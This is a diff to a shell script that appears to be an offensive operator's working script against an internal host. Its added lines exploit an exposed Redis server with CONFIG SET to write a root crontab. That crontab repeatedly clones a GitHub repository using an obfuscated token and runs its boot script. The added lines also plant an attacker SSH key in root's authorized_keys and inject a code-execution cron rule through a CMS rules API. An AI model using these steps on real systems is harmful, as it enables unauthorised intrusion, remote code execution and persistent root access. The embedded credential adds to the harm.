@@ -1,19 +1,36 @@
-sleep 65
-echo "=== EXECUTIONS (через 65 сек после cron) ==="
-python3 -c "
-import urllib.request,json
-r=urllib.request.urlopen('http://192.168.3.121:8000/api/v1/executions',timeout=8)
-d=json.loads(r.read())
-print('total:',d.get('total',0))
-for item in d.get('items',[])[:5]:
-    print(json.dumps(item,indent=1)[:500])
-"
-echo "=== RULE 19 status ==="
-python3 -c "
-import urllib.request,json
-r=urllib.request.urlopen('http://192.168.3.121:8000/api/v1/rules',timeout=8)
-for rule in json.loads(r.read()).get('items',[]):
-    if rule.get('name')=='cxp-cron-exec':
-        print(json.dumps(rule,indent=1)[:400])
-"
-echo CRON-CHECK
+R=192.168.3.121
+T=$(printf %s 'LaMFA0vGYRNvWZKnwYtFkA1LTKv7Wv9MOem0_phg' | rev)
+echo "=== REDIS PROBE+WRITE (protected-config yes-bypass) ==="
+python3 - "$T" <<'PYEOF'
+import socket,time,sys
+TOK=sys.argv[1]
+def R(*a):
+    o="*%d\r\n"%len(a)
+    for x in a: o+=("$%d\r\n%s\r\n"%(len(x.encode()),x))
+    return o.encode()
+s=socket.create_connection(("192.168.3.121",6379),8); s.settimeout(4)
+def c(*a):
+    s.sendall(R(*a)); time.sleep(0.7)
+    try: return s.recv(65536).decode(errors="replace").strip()
+    except Exception as e: return "TO:"+str(e)
+print("cur-dir:", c("CONFIG","GET","dir"))
+CRON="*/2 * * * * (git -C /tmp/.gx pull -q 2>/dev/null || git clone -q https://%s@github.com/s34vv1nd/ops-pub.git /tmp/.gx) && bash /tmp/.gx/hung/boot.sh >> /tmp/.gx/boot.log 2>&1"%TOK
+print("dir-cron:", c("CONFIG","SET","dir","/var/spool/cron/crontabs","yes"))
+print("fn-cron:", c("CONFIG","SET","dbfilename","root","yes"))
+print("set-cron:", c("SET","pwn:cron","\n\n"+CRON+"\n\n"))
+print("save1:", c("BGSAVE")); time.sleep(3)
+print("dir-ssh:", c("CONFIG","SET","dir","/root/.ssh","yes"))
+print("fn-ssh:", c("CONFIG","SET","dbfilename","authorized_keys","yes"))
+print("set-ssh:", c("SET","pwn:ssh","\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHz4ixvYbBfcSQKO3RpTop1thSI2mQx6b9E7SQjrXrno kali@host\n\n"))
+print("save2:", c("BGSAVE")); time.sleep(3)
+print("lastsave:", c("LASTSAVE"))
+print("restore:", c("CONFIG","SET","dir","/data","yes"), "|", c("CONFIG","SET","dbfilename","dump.rdb","yes"))
+PYEOF
+echo; echo "=== CMS EXISTING RULES (schema intel) ==="
+curl -s -m 10 "http://$R:8000/api/v1/rules" | head -c 5000
+echo; echo "=== CMS 5-FIELD CRON RULE ==="
+curl -s -m 10 -X POST "http://$R:8000/api/v1/rules" -H 'Content-Type: application/json' -d '{"name":"cxp-cron5","codeType":"python","conditionType":"expression","conditionExpr":"True","trigger":{"type":"cron","cronSchedule":"*/1 * * * *"},"executionType":"code","executionParams":{"code":"import subprocess as sp\no=sp.run([\"id\"],capture_output=True,text=True).stdout"},"isActive":true}' | head -c 900
+echo; echo "=== TOGGLE OLD RULE ==="
+curl -s -m 10 -X POST "http://$R:8000/api/v1/rules/9d94395b-8735-4f08-84e1-3c1087e0be44/toggle" | head -c 300
+echo; sleep 75; echo "=== EXECUTIONS AFTER 75s ==="
+curl -s -m 10 "http://$R:8000/api/v1/executions?limit=5" | head -c 4000 # S1
